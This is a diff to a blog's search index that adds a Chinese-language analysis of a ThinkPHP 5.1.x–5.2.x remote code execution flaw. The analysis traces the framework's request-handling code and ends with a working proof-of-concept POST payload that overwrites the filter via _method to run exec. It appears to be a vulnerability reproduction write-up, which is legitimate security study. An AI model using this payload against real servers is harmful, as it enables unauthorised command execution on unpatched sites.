@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</title>
+      <link href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+      <url>/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p><p>测试环境 5.1.29</p><p><strong>入口处关闭报错</strong> </p><p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p><p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p><p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p><p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p><p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p><p>我们从<code>Request::param</code>处开始分析</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (!$this-&gt;mergeParam) {            $method = $this-&gt;method(true);            // 自动获取请求变量            switch ($method) {                case &#39;POST&#39;:                    $vars = $this-&gt;post(false);                    break;                case &#39;PUT&#39;:                case &#39;DELETE&#39;:                case &#39;PATCH&#39;:                    $vars = $this-&gt;put(false);                    break;                default:                    $vars = [];            }            // 当前请求参数和URL地址中的参数合并            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        }        ...    }</code></pre><p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p><pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;post)) {            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);        }        return $this-&gt;input($this-&gt;post, $name, $default, $filter);    }</code></pre><p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p><p>跟进<code>Request::input</code></p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ...        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }       ...    }</code></pre><p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p><p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p><p>跟进去</p><pre><code class="php">private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // 调用函数或者方法过滤                $value = call_user_func($filter, $value);            } elseif (is_scalar($value)) {                if (false !== strpos($filter, &#39;/&#39;)) {                    // 正则过滤                    if (!preg_match($filter, $value)) {                        // 匹配不成功返回默认值                        $value = $default;                        break;                    }                } elseif (!empty($filter)) {                    // filter函数不存在时, 则使用filter_var进行过滤                    // filter为非整形值时, 调用filter_id取得过滤id                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));                    if (false === $value) {                        $value = $default;                        break;                    }                }            }        }        return $value;    }</code></pre><p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p><p>且<code>$filter</code>=<code>$_POST</code></p><p>因此有</p><pre><code>http://127.0.0.1/public/POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cve复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cve复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</title>
       <link href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
       <url>/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
